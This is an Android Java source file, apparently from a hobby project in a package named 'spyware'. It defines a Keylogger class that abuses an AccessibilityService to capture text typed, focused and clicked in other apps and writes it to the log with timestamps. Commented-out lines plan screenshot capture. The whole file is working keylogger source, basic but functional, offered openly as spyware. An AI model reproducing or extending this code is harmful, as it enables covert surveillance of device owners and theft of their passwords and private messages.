package com.example.cristianturetta.spyware;

import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.content.Context;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.accessibility.AccessibilityEvent;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class Keylogger extends AccessibilityService{

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        DateFormat df = new SimpleDateFormat("dd/mm/yyyy, HH:mm:ss z", Locale.ITALIAN);
        String time = df.format(Calendar.getInstance().getTime());

        // TODO find a way in order to get the  current activity from here
        // ScreenShooter may take an activity instead a context in his constructor
        // ScreenShooter shooter = new ScreenShooter(this);
        // shooter.takeScreenShot();

        switch(accessibilityEvent.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = accessibilityEvent.getText().toString();
                Log.d("Captured",time + "|(TEXT)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = accessibilityEvent.getText().toString();
                Log.d("Captured",time + "|(FOCUSED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = accessibilityEvent.getText().toString();
                Log.d("Captured",time + "|(CLICKED)|" + data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
